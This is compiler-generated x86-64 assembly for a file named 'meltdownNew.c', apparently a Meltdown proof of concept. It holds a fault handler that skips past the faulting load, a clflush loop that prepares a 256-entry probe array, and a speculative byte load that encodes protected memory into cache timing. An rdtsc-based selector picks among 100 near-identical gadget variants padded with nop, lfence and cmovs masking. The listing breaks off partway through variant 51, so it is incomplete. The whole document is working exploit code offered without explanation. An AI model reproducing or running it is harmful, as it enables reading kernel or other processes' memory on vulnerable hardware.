	.file	"meltdownNew.c"
	.text
	.type	sigaction_segv, @function
sigaction_segv:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
	leaq	__speculative_byte_load_exit(%rip), %rdx
	movq	-8(%rbp), %rax
	movq	%rdx, 168(%rax)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	sigaction_segv, .-sigaction_segv
	.globl	probe_one
	.type	probe_one, @function
probe_one:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$2424, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -2408(%rbp)
	movq	%rsi, -2416(%rbp)
	movl	%edx, -2420(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$5, -2376(%rbp)
	movl	$0, -2372(%rbp)
	movl	$0, -2384(%rbp)
	movl	$0, -2380(%rbp)
	movb	$0, -2393(%rbp)
	movq	$0, -2360(%rbp)
	leaq	-288(%rbp), %rax
	movl	$256, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2392(%rbp)
	jmp	.L3
.L13:
	leaq	-2336(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2388(%rbp)
	jmp	.L4
.L5:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2352(%rbp)
	movq	-2352(%rbp), %rax
#APP
# 104 "meltdownNew.c" 1
	mfence
	clflush	0(%rax)
# 0 "" 2
#NO_APP
	nop
	addl	$1, -2388(%rbp)
.L4:
	cmpl	$255, -2388(%rbp)
	jle	.L5
	movl	$0, %edx
	movl	$0, %esi
	movl	$-1, %edi
	call	read@PLT
	movq	-2408(%rbp), %rdx
	movq	-2416(%rbp), %rcx
#APP
# 156 "meltdownNew.c" 1
	.global __speculative_byte_load_exit 
	92:                              
	xorq	%rax, %rax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lprobe_one_win0_var0
	cmpl	$1, %eax
	je	.Lprobe_one_win0_var1
	cmpl	$2, %eax
	je	.Lprobe_one_win0_var2
	cmpl	$3, %eax
	je	.Lprobe_one_win0_var3
	cmpl	$4, %eax
	je	.Lprobe_one_win0_var4
	cmpl	$5, %eax
	je	.Lprobe_one_win0_var5
	cmpl	$6, %eax
	je	.Lprobe_one_win0_var6
	cmpl	$7, %eax
	je	.Lprobe_one_win0_var7
	cmpl	$8, %eax
	je	.Lprobe_one_win0_var8
	cmpl	$9, %eax
	je	.Lprobe_one_win0_var9
	cmpl	$10, %eax
	je	.Lprobe_one_win0_var10
	cmpl	$11, %eax
	je	.Lprobe_one_win0_var11
	cmpl	$12, %eax
	je	.Lprobe_one_win0_var12
	cmpl	$13, %eax
	je	.Lprobe_one_win0_var13
	cmpl	$14, %eax
	je	.Lprobe_one_win0_var14
	cmpl	$15, %eax
	je	.Lprobe_one_win0_var15
	cmpl	$16, %eax
	je	.Lprobe_one_win0_var16
	cmpl	$17, %eax
	je	.Lprobe_one_win0_var17
	cmpl	$18, %eax
	je	.Lprobe_one_win0_var18
	cmpl	$19, %eax
	je	.Lprobe_one_win0_var19
	cmpl	$20, %eax
	je	.Lprobe_one_win0_var20
	cmpl	$21, %eax
	je	.Lprobe_one_win0_var21
	cmpl	$22, %eax
	je	.Lprobe_one_win0_var22
	cmpl	$23, %eax
	je	.Lprobe_one_win0_var23
	cmpl	$24, %eax
	je	.Lprobe_one_win0_var24
	cmpl	$25, %eax
	je	.Lprobe_one_win0_var25
	cmpl	$26, %eax
	je	.Lprobe_one_win0_var26
	cmpl	$27, %eax
	je	.Lprobe_one_win0_var27
	cmpl	$28, %eax
	je	.Lprobe_one_win0_var28
	cmpl	$29, %eax
	je	.Lprobe_one_win0_var29
	cmpl	$30, %eax
	je	.Lprobe_one_win0_var30
	cmpl	$31, %eax
	je	.Lprobe_one_win0_var31
	cmpl	$32, %eax
	je	.Lprobe_one_win0_var32
	cmpl	$33, %eax
	je	.Lprobe_one_win0_var33
	cmpl	$34, %eax
	je	.Lprobe_one_win0_var34
	cmpl	$35, %eax
	je	.Lprobe_one_win0_var35
	cmpl	$36, %eax
	je	.Lprobe_one_win0_var36
	cmpl	$37, %eax
	je	.Lprobe_one_win0_var37
	cmpl	$38, %eax
	je	.Lprobe_one_win0_var38
	cmpl	$39, %eax
	je	.Lprobe_one_win0_var39
	cmpl	$40, %eax
	je	.Lprobe_one_win0_var40
	cmpl	$41, %eax
	je	.Lprobe_one_win0_var41
	cmpl	$42, %eax
	je	.Lprobe_one_win0_var42
	cmpl	$43, %eax
	je	.Lprobe_one_win0_var43
	cmpl	$44, %eax
	je	.Lprobe_one_win0_var44
	cmpl	$45, %eax
	je	.Lprobe_one_win0_var45
	cmpl	$46, %eax
	je	.Lprobe_one_win0_var46
	cmpl	$47, %eax
	je	.Lprobe_one_win0_var47
	cmpl	$48, %eax
	je	.Lprobe_one_win0_var48
	cmpl	$49, %eax
	je	.Lprobe_one_win0_var49
	cmpl	$50, %eax
	je	.Lprobe_one_win0_var50
	cmpl	$51, %eax
	je	.Lprobe_one_win0_var51
	cmpl	$52, %eax
	je	.Lprobe_one_win0_var52
	cmpl	$53, %eax
	je	.Lprobe_one_win0_var53
	cmpl	$54, %eax
	je	.Lprobe_one_win0_var54
	cmpl	$55, %eax
	je	.Lprobe_one_win0_var55
	cmpl	$56, %eax
	je	.Lprobe_one_win0_var56
	cmpl	$57, %eax
	je	.Lprobe_one_win0_var57
	cmpl	$58, %eax
	je	.Lprobe_one_win0_var58
	cmpl	$59, %eax
	je	.Lprobe_one_win0_var59
	cmpl	$60, %eax
	je	.Lprobe_one_win0_var60
	cmpl	$61, %eax
	je	.Lprobe_one_win0_var61
	cmpl	$62, %eax
	je	.Lprobe_one_win0_var62
	cmpl	$63, %eax
	je	.Lprobe_one_win0_var63
	cmpl	$64, %eax
	je	.Lprobe_one_win0_var64
	cmpl	$65, %eax
	je	.Lprobe_one_win0_var65
	cmpl	$66, %eax
	je	.Lprobe_one_win0_var66
	cmpl	$67, %eax
	je	.Lprobe_one_win0_var67
	cmpl	$68, %eax
	je	.Lprobe_one_win0_var68
	cmpl	$69, %eax
	je	.Lprobe_one_win0_var69
	cmpl	$70, %eax
	je	.Lprobe_one_win0_var70
	cmpl	$71, %eax
	je	.Lprobe_one_win0_var71
	cmpl	$72, %eax
	je	.Lprobe_one_win0_var72
	cmpl	$73, %eax
	je	.Lprobe_one_win0_var73
	cmpl	$74, %eax
	je	.Lprobe_one_win0_var74
	cmpl	$75, %eax
	je	.Lprobe_one_win0_var75
	cmpl	$76, %eax
	je	.Lprobe_one_win0_var76
	cmpl	$77, %eax
	je	.Lprobe_one_win0_var77
	cmpl	$78, %eax
	je	.Lprobe_one_win0_var78
	cmpl	$79, %eax
	je	.Lprobe_one_win0_var79
	cmpl	$80, %eax
	je	.Lprobe_one_win0_var80
	cmpl	$81, %eax
	je	.Lprobe_one_win0_var81
	cmpl	$82, %eax
	je	.Lprobe_one_win0_var82
	cmpl	$83, %eax
	je	.Lprobe_one_win0_var83
	cmpl	$84, %eax
	je	.Lprobe_one_win0_var84
	cmpl	$85, %eax
	je	.Lprobe_one_win0_var85
	cmpl	$86, %eax
	je	.Lprobe_one_win0_var86
	cmpl	$87, %eax
	je	.Lprobe_one_win0_var87
	cmpl	$88, %eax
	je	.Lprobe_one_win0_var88
	cmpl	$89, %eax
	je	.Lprobe_one_win0_var89
	cmpl	$90, %eax
	je	.Lprobe_one_win0_var90
	cmpl	$91, %eax
	je	.Lprobe_one_win0_var91
	cmpl	$92, %eax
	je	.Lprobe_one_win0_var92
	cmpl	$93, %eax
	je	.Lprobe_one_win0_var93
	cmpl	$94, %eax
	je	.Lprobe_one_win0_var94
	cmpl	$95, %eax
	je	.Lprobe_one_win0_var95
	cmpl	$96, %eax
	je	.Lprobe_one_win0_var96
	cmpl	$97, %eax
	je	.Lprobe_one_win0_var97
	cmpl	$98, %eax
	je	.Lprobe_one_win0_var98
	cmpl	$99, %eax
	je	.Lprobe_one_win0_var99
	jmp	.Lprobe_one_win0_var0
## Variant 0
.Lprobe_one_win0_var0:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 1
.Lprobe_one_win0_var1:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 2
.Lprobe_one_win0_var2:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	nop
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 3
.Lprobe_one_win0_var3:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 4
.Lprobe_one_win0_var4:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 5
.Lprobe_one_win0_var5:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	nop
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 6
.Lprobe_one_win0_var6:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 7
.Lprobe_one_win0_var7:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	nop
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 8
.Lprobe_one_win0_var8:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 9
.Lprobe_one_win0_var9:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	nop
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 10
.Lprobe_one_win0_var10:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 11
.Lprobe_one_win0_var11:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 12
.Lprobe_one_win0_var12:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 13
.Lprobe_one_win0_var13:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 14
.Lprobe_one_win0_var14:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 15
.Lprobe_one_win0_var15:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 16
.Lprobe_one_win0_var16:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	nop
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 17
.Lprobe_one_win0_var17:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 18
.Lprobe_one_win0_var18:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 19
.Lprobe_one_win0_var19:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	nop
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 20
.Lprobe_one_win0_var20:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	nop
	lfence
	shlq	$0xc, %rax
	jz	92b
	nop
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 21
.Lprobe_one_win0_var21:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 22
.Lprobe_one_win0_var22:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 23
.Lprobe_one_win0_var23:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 24
.Lprobe_one_win0_var24:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 25
.Lprobe_one_win0_var25:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 26
.Lprobe_one_win0_var26:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 27
.Lprobe_one_win0_var27:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 28
.Lprobe_one_win0_var28:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	nop
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 29
.Lprobe_one_win0_var29:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	nop
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 30
.Lprobe_one_win0_var30:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 31
.Lprobe_one_win0_var31:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 32
.Lprobe_one_win0_var32:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 33
.Lprobe_one_win0_var33:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 34
.Lprobe_one_win0_var34:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	nop
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 35
.Lprobe_one_win0_var35:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 36
.Lprobe_one_win0_var36:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 37
.Lprobe_one_win0_var37:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	nop
	cmovs	%r10, %rdx
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 38
.Lprobe_one_win0_var38:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	nop
	movb	(%rdx), %al
	nop
	lfence
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	lfence
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 39
.Lprobe_one_win0_var39:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 40
.Lprobe_one_win0_var40:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 41
.Lprobe_one_win0_var41:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	nop
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 42
.Lprobe_one_win0_var42:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	nop
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 43
.Lprobe_one_win0_var43:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 44
.Lprobe_one_win0_var44:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 45
.Lprobe_one_win0_var45:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 46
.Lprobe_one_win0_var46:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 47
.Lprobe_one_win0_var47:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 48
.Lprobe_one_win0_var48:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 49
.Lprobe_one_win0_var49:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	nop
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 50
.Lprobe_one_win0_var50:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 51
.Lprobe_one_win0_var51:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
